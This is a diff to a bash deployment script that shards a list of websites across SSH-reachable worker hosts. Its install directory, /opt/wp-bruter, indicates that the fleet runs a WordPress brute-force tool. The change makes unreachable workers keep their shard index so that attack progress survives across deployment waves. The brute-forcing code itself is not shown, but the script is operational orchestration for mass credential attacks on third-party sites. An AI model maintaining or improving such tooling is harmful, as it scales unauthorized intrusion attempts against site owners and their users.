@@ -32,20 +32,15 @@ N=${#WORKERS[@]}
 SHARD_DIR=$(mktemp -d)
 trap 'rm -rf "$SHARD_DIR"' EXIT
 
-# Pre-flight: only shard across boxes that answer right now, so a dead host
-# does not silently swallow a shard of the list.
-LIVE=()
+# Shards are keyed to the fleet file, not to how many hosts answer: a dead box
+# keeps its index so the mapping (and everyone's progress) survives a wave with
+# one host down.
+LIVE=0
 for WORKER in "${WORKERS[@]}"; do
-    if ssh_cmd "$WORKER" 'true' 2>/dev/null; then
-        LIVE+=("$WORKER")
-    else
-        echo "[$WORKER] unreachable — dropped"
-    fi
+    ssh_cmd "$WORKER" 'true' 2>/dev/null && LIVE=$((LIVE + 1)) || echo "[$WORKER] unreachable — its shard waits for the next deploy"
 done
-[ ${#LIVE[@]} -gt 0 ] || { echo "no live workers" >&2; exit 1; }
-WORKERS=("${LIVE[@]}")
-N=${#WORKERS[@]}
-echo "pre-flight: ${#WORKERS[@]} live workers"
+[ "$LIVE" -gt 0 ] || { echo "no live workers" >&2; exit 1; }
+echo "pre-flight: $LIVE/$N workers live"
 
 # Stable hash -> shard index, so a site does not move when the fleet size
 # changes. Sort then split; the stray index prefix is stripped.
@@ -71,6 +66,11 @@ ALL=0
 idx=0
 for WORKER in "${WORKERS[@]}"; do
     SHARD="$SHARD_DIR/$idx.txt"
+    if ! ssh_cmd "$WORKER" 'true' 2>/dev/null; then
+        echo "[$WORKER] shard $idx skipped (unreachable)"
+        idx=$((idx + 1))
+        continue
+    fi
     echo "[$WORKER] shard $idx ($(wc -l < "$SHARD") sites)"
     (
         ssh_cmd "$WORKER" "mkdir -p /opt/wp-bruter" 2>/dev/null || echo '  ❌ mkdir failed'
